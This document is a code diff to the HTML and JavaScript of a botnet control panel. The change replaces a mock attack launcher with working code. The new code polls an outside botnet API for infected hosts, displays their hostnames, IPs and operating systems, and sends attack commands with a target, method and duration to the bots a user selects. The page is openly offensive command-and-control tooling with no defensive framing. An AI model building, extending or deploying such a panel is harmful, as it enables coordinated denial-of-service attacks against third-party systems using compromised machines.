@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -13,26 +12,23 @@
             margin: 0;
             padding: 0;
         }
-
         .container {
             width: 80%;
             margin: auto;
             padding-top: 20px;
         }
-
         .panel {
             background-color: #1e2a38;
             padding: 20px;
             border-radius: 10px;
             margin-bottom: 20px;
         }
-
         .header {
             font-size: 24px;
             font-weight: bold;
             color: #00aaff;
+            margin-bottom: 15px;
         }
-
         .button {
             display: inline-block;
             padding: 10px 20px;
@@ -41,39 +37,35 @@
             cursor: pointer;
             margin-top: 10px;
         }
-
         .button.red {
             background-color: #ff4d4d;
             color: white;
         }
-
         .button.blue {
             background-color: #0088cc;
             color: white;
         }
-
-        .input,
-        .dropdown {
+        .input, .dropdown {
             padding: 10px;
             border-radius: 5px;
             border: none;
             width: calc(100% - 22px);
             margin-bottom: 10px;
+            background-color: #2a3a4d;
+            color: white;
         }
-
         .log {
             font-size: 14px;
             background-color: #141e2f;
             padding: 10px;
             border-radius: 5px;
+            margin-bottom: 5px;
         }
-
         .stats {
             display: flex;
             justify-content: space-between;
             margin-bottom: 20px;
         }
-
         .stats div {
             background-color: #142738;
             padding: 10px;
@@ -82,65 +74,27 @@
             flex: 1;
             margin: 5px;
         }
+        .bot-list {
+            max-height: 300px;
+            overflow-y: auto;
+        }
     </style>
-    <script>
-        async function getOnlineBots() {
-            try {
-                const response = await fetch("https://botnet-api.vercel.app/api/bots");
-                const data = await response.json();
-                // Update the Total Bots div to display the number of online bots
-                document.querySelector(".stats div:first-child").innerHTML = `Total Bots: <strong>${data.online_bots}</strong>`;
-            } catch (error) {
-                console.error("Error fetching bots:", error);
-            }
-        }
-
-        function isValidIP(ip) {
-            const regex = /^(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)$/;
-            return regex.test(ip);
-        }
-
-        function launchAttack() {
-            let target = document.getElementById('target').value;
-            let method = document.getElementById('method').value;
-            let duration = parseInt(document.getElementById('duration').value);
-
-            if (!isValidIP(target)) {
-                alert("Invalid IP address. Please enter a valid IP.");
-                return;
-            }
-
-            if (duration > 120) {
-                alert("Duration cannot exceed 120 seconds.");
-                return;
-            }
-
-            alert(`Launching ${method} attack on ${target} for ${duration} seconds.`);
-        }
-
-        function checkStatus() {
-            alert("Checking target status...");
-        }
-
-        // Call the function to update the bot count when the page loads
-        window.onload = getOnlineBots;
-    </script>
 </head>
-
 <body>
     <div class="container">
         <div class="panel">
             <div class="header">Control Panel</div>
         </div>
         <div class="stats">
-            <div>Total Bots: <strong>1</strong></div>
-            <div>Online: <strong>1</strong></div>
-            <div>Offline: <strong>0</strong></div>
+            <div>Total Bots: <strong id="total-bots">0</strong></div>
+            <div>Online: <strong id="online-bots">0</strong></div>
+            <div>Offline: <strong id="offline-bots">0</strong></div>
         </div>
         <div class="panel">
             <div class="header">Connected Bots</div>
-            <div class="log">Bot ID: 5da512d8 - <span style="color:green;">ONLINE</span></div>
-            <div class="log">IP: 37.201.184.171</div>
+            <div class="bot-list" id="bot-list">
+                <div class="log">No bots connected</div>
+            </div>
         </div>
         <div class="panel">
             <div class="header">Launch Attack</div>
@@ -158,9 +112,115 @@
         </div>
         <div class="panel">
             <div class="header">Activity Log</div>
-            <div class="log">[07:05:33] System initialized. Waiting for bots to connect...</div>
+            <div class="log" id="activity-log">[System initialized. Waiting for bots to connect...]</div>
         </div>
     </div>
-</body>
 
+    <script>
+        const API_URL = "https://botnet-api.vercel.app/api/bots";
+        let selectedBots = [];
+
+        async function fetchBots() {
+            try {
+                const response = await fetch(API_URL);
+                const data = await response.json();
+                updateBotDisplay(data.bots);
+            } catch {
+                logActivity("Failed to fetch bots from server");
+            }
+        }
+
+        function updateBotDisplay(bots) {
+            const botList = document.getElementById('bot-list');
+            const totalBots = document.getElementById('total-bots');
+            const onlineBots = document.getElementById('online-bots');
+            
+            botList.innerHTML = '';
+            totalBots.textContent = bots.length;
+            onlineBots.textContent = bots.length;
+            
+            if (bots.length === 0) {
+                botList.innerHTML = '<div class="log">No bots connected</div>';
+                return;
+            }
+
+            bots.forEach(bot => {
+                const botElement = document.createElement('div');
+                botElement.className = 'log';
+                botElement.innerHTML = `
+                    <input type="checkbox" id="bot-${bot.hostname}" onchange="toggleBotSelection('${bot.hostname}')">
+                    <label for="bot-${bot.hostname}">${bot.hostname}</label> - 
+                    <span style="color:green;">ONLINE</span><br>
+                    IP: ${bot.ip} | OS: ${bot.os}
+                `;
+                botList.appendChild(botElement);
+            });
+        }
+
+        function toggleBotSelection(hostname) {
+            const index = selectedBots.indexOf(hostname);
+            if (index === -1) {
+                selectedBots.push(hostname);
+            } else {
+                selectedBots.splice(index, 1);
+            }
+        }
+
+        async function launchAttack() {
+            const target = document.getElementById('target').value;
+            const method = document.getElementById('method').value;
+            const duration = parseInt(document.getElementById('duration').value);
+
+            if (!target || !duration) {
+                logActivity("Error: Target and duration are required");
+                return;
+            }
+
+            if (selectedBots.length === 0) {
+                logActivity("Error: No bots selected for attack");
+                return;
+            }
+
+            try {
+                const response = await fetch(API_URL + '/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        hostnames: selectedBots,
+                        command: {
+                            type: "attack",
+                            method: method,
+                            target: target,
+                            duration: duration
+                        }
+                    })
+                });
+                
+                if (response.ok) {
+                    logActivity(`Attack command sent to ${selectedBots.length} bots: ${method} on ${target} for ${duration}s`);
+                } else {
+                    logActivity("Failed to send attack command");
+                }
+            } catch {
+                logActivity("Network error while sending attack command");
+            }
+        }
+
+        function checkStatus() {
+            logActivity("Target status check not implemented");
+        }
+
+        function logActivity(message) {
+            const now = new Date();
+            const timeString = `[${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}]`;
+            const logElement = document.getElementById('activity-log');
+            logElement.innerHTML = `${timeString} ${message}<br>${logElement.innerHTML}`;
+        }
+
+        window.onload = function() {
+            fetchBots();
+            setInterval(fetchBots, 10000);
+        };
+    </script>
+</body>
 </html>
